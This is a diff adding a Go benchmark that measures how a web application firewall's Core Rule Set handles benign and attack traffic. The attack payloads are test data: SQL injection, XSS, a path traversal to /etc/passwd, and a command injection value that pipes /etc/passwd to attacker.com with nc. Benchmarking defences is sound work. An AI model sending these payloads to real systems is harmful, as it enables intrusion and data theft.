@@ -151,6 +151,252 @@ func BenchmarkCRSLargePOST(b *testing.B) {
 	}
 }
 
+// BenchmarkCRSPrefilter measures CRS request processing across diverse traffic
+// patterns. Run with and without the coraza.rule.rx_prefilter build tag and
+// compare via benchstat:
+//
+//	go test -bench=BenchmarkCRSPrefilter -benchmem -count=6 ./testing/coreruleset/ > baseline.txt
+//	go test -tags coraza.rule.rx_prefilter -bench=BenchmarkCRSPrefilter -benchmem -count=6 ./testing/coreruleset/ > prefilter.txt
+//	benchstat baseline.txt prefilter.txt
+func BenchmarkCRSPrefilter(b *testing.B) {
+	waf := crsWAF(b)
+
+	chromeUA := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+
+	// --- Benign payloads ---
+
+	formBody := []byte("first_name=John&last_name=Doe&email=john.doe@example.com&phone=555-0123&address=123+Main+Street&city=Springfield&state=IL&zip=62701")
+
+	multipartBoundary := "----WebKitFormBoundaryABC123"
+	multipartBody := []byte("------WebKitFormBoundaryABC123\r\n" +
+		"Content-Disposition: form-data; name=\"description\"\r\n\r\n" +
+		"Quarterly report Q1 2025\r\n" +
+		"------WebKitFormBoundaryABC123\r\n" +
+		"Content-Disposition: form-data; name=\"file\"; filename=\"report.pdf\"\r\n" +
+		"Content-Type: application/pdf\r\n\r\n" +
+		strings.Repeat("ABCDEFGHIJ", 100) + "\r\n" +
+		"------WebKitFormBoundaryABC123--\r\n")
+
+	graphqlBody := []byte(`{"query":"query GetUser($id: ID!) { user(id: $id) { name email posts { title createdAt } } }","variables":{"id":"usr_42"}}`)
+
+	// --- Attack payloads ---
+
+	sqliBody := []byte("username=admin' OR '1'='1&password=anything' UNION SELECT * FROM information_schema.tables--")
+	xssBody := []byte("comment=<img src=x onerror=alert(1)>&post_id=42")
+	cmdiBody := []byte("host=127.0.0.1; cat /etc/passwd | nc attacker.com 4444")
+
+	// Helper: full transaction lifecycle for a GET request.
+	doGET := func(b *testing.B, uri string, headers [][2]string) {
+		b.Helper()
+		b.ReportAllocs()
+		b.ResetTimer()
+		for i := 0; i < b.N; i++ {
+			tx := waf.NewTransaction()
+			tx.ProcessConnection("127.0.0.1", 8080, "10.0.0.1", 443)
+			tx.ProcessURI(uri, "GET", "HTTP/1.1")
+			tx.AddRequestHeader("Host", "app.example.com")
+			tx.AddRequestHeader("User-Agent", chromeUA)
+			for _, h := range headers {
+				tx.AddRequestHeader(h[0], h[1])
+			}
+			tx.ProcessRequestHeaders()
+			if _, err := tx.ProcessRequestBody(); err != nil {
+				b.Error(err)
+			}
+			tx.AddResponseHeader("Content-Type", "application/json")
+			tx.ProcessResponseHeaders(200, "OK")
+			if _, err := tx.ProcessResponseBody(); err != nil {
+				b.Error(err)
+			}
+			tx.ProcessLogging()
+			if err := tx.Close(); err != nil {
+				b.Error(err)
+			}
+		}
+	}
+
+	// Helper: full transaction lifecycle for a POST request.
+	doPOST := func(b *testing.B, uri, contentType string, body []byte, headers [][2]string) {
+		b.Helper()
+		b.ReportAllocs()
+		b.ResetTimer()
+		for i := 0; i < b.N; i++ {
+			tx := waf.NewTransaction()
+			tx.ProcessConnection("127.0.0.1", 8080, "10.0.0.1", 443)
+			tx.ProcessURI(uri, "POST", "HTTP/1.1")
+			tx.AddRequestHeader("Host", "app.example.com")
+			tx.AddRequestHeader("User-Agent", chromeUA)
+			tx.AddRequestHeader("Content-Type", contentType)
+			for _, h := range headers {
+				tx.AddRequestHeader(h[0], h[1])
+			}
+			tx.ProcessRequestHeaders()
+			if _, _, err := tx.WriteRequestBody(body); err != nil {
+				b.Error(err)
+			}
+			if _, err := tx.ProcessRequestBody(); err != nil {
+				b.Error(err)
+			}
+			tx.AddResponseHeader("Content-Type", "application/json")
+			tx.ProcessResponseHeaders(200, "OK")
+			if _, err := tx.ProcessResponseBody(); err != nil {
+				b.Error(err)
+			}
+			tx.ProcessLogging()
+			if err := tx.Close(); err != nil {
+				b.Error(err)
+			}
+		}
+	}
+
+	// ===== Benign traffic =====
+
+	b.Run("Benign/APICall", func(b *testing.B) {
+		doGET(b,
+			"/api/v2/users?page=1&limit=50&sort=created_at&order=desc",
+			[][2]string{
+				{"Accept", "application/json"},
+				{"Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfNDIifQ.signature"},
+			},
+		)
+	})
+
+	b.Run("Benign/FormSubmission", func(b *testing.B) {
+		doPOST(b,
+			"/account/profile/update",
+			"application/x-www-form-urlencoded",
+			formBody,
+			[][2]string{{"Accept", "text/html"}, {"Referer", "https://app.example.com/account/profile"}},
+		)
+	})
+
+	b.Run("Benign/FileUpload", func(b *testing.B) {
+		doPOST(b,
+			"/api/v1/documents/upload",
+			"multipart/form-data; boundary="+multipartBoundary,
+			multipartBody,
+			[][2]string{{"Accept", "application/json"}},
+		)
+	})
+
+	b.Run("Benign/StaticAsset", func(b *testing.B) {
+		doGET(b,
+			"/assets/css/main.min.css",
+			[][2]string{
+				{"Accept", "text/css,*/*;q=0.1"},
+				{"Accept-Encoding", "gzip, deflate, br"},
+				{"If-None-Match", `"v2-abc123def456"`},
+			},
+		)
+	})
+
+	b.Run("Benign/GraphQL", func(b *testing.B) {
+		doPOST(b,
+			"/graphql",
+			"application/json",
+			graphqlBody,
+			[][2]string{{"Accept", "application/json"}},
+		)
+	})
+
+	// ===== Attack traffic =====
+
+	b.Run("Attack/SQLi_QueryString", func(b *testing.B) {
+		doGET(b,
+			"/search?q=' OR 1=1 UNION SELECT username,password FROM users--&category=all",
+			[][2]string{{"Accept", "text/html"}},
+		)
+	})
+
+	b.Run("Attack/SQLi_Body", func(b *testing.B) {
+		doPOST(b,
+			"/login",
+			"application/x-www-form-urlencoded",
+			sqliBody,
+			nil,
+		)
+	})
+
+	b.Run("Attack/SQLi_Header", func(b *testing.B) {
+		doGET(b,
+			"/dashboard",
+			[][2]string{
+				{"Accept", "text/html"},
+				{"Cookie", "session=abc123; prefs=' UNION SELECT 1,2,3--"},
+				{"Referer", "http://example.com/search?q='; DROP TABLE users;--"},
+			},
+		)
+	})
+
+	b.Run("Attack/XSS_QueryString", func(b *testing.B) {
+		doGET(b,
+			`/search?q=<script>alert(document.cookie)</script>&page=1`,
+			[][2]string{{"Accept", "text/html"}},
+		)
+	})
+
+	b.Run("Attack/XSS_Body", func(b *testing.B) {
+		doPOST(b,
+			"/api/comments",
+			"application/x-www-form-urlencoded",
+			xssBody,
+			[][2]string{{"Accept", "application/json"}},
+		)
+	})
+
+	b.Run("Attack/PathTraversal", func(b *testing.B) {
+		doGET(b,
+			"/files/download?path=..%2f..%2f..%2fetc%2fpasswd",
+			[][2]string{{"Accept", "application/octet-stream"}},
+		)
+	})
+
+	b.Run("Attack/CMDi_Body", func(b *testing.B) {
+		doPOST(b,
+			"/api/tools/ping",
+			"application/x-www-form-urlencoded",
+			cmdiBody,
+			nil,
+		)
+	})
+
+	// ===== Mixed traffic (90% benign, 10% attack) =====
+
+	b.Run("Mixed/90Benign_10Attack", func(b *testing.B) {
+		b.ReportAllocs()
+		b.ResetTimer()
+		for i := 0; i < b.N; i++ {
+			tx := waf.NewTransaction()
+			tx.ProcessConnection("127.0.0.1", 8080, "10.0.0.1", 443)
+
+			if i%10 == 0 {
+				// Attack: SQLi in query string
+				tx.ProcessURI("/search?q=' OR 1=1 UNION SELECT username,password FROM users--&category=all", "GET", "HTTP/1.1")
+			} else {
+				// Benign: API call
+				tx.ProcessURI("/api/v2/users?page=1&limit=50&sort=created_at&order=desc", "GET", "HTTP/1.1")
+			}
+
+			tx.AddRequestHeader("Host", "app.example.com")
+			tx.AddRequestHeader("User-Agent", chromeUA)
+			tx.AddRequestHeader("Accept", "application/json")
+			tx.ProcessRequestHeaders()
+			if _, err := tx.ProcessRequestBody(); err != nil {
+				b.Error(err)
+			}
+			tx.AddResponseHeader("Content-Type", "application/json")
+			tx.ProcessResponseHeaders(200, "OK")
+			if _, err := tx.ProcessResponseBody(); err != nil {
+				b.Error(err)
+			}
+			tx.ProcessLogging()
+			if err := tx.Close(); err != nil {
+				b.Error(err)
+			}
+		}
+	})
+}
+
 // BenchmarkCRSTransformationCache measures the transformation cache performance
 // across different request sizes. The transformation cache benefit scales with
 // (number of arguments) × (number of rules sharing transformation prefixes),
